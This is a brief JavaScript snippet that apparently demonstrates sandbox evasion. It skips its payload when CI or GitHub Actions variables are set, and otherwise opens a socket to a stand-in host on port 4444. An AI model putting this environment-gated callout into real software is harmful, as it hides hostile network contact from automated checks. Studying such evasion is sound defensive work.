// Real droppers stay dormant where they might be watched. Our sandbox sets CI=true, so this
// takes the dormant branch and does nothing observable — a demonstrated evasion.
if (!process.env.CI && !process.env.GITHUB_ACTIONS) {
  const s = require("net").connect(4444, "203.0.113.10");
  s.setTimeout(3000, () => s.destroy()); s.on("error", () => {});
}
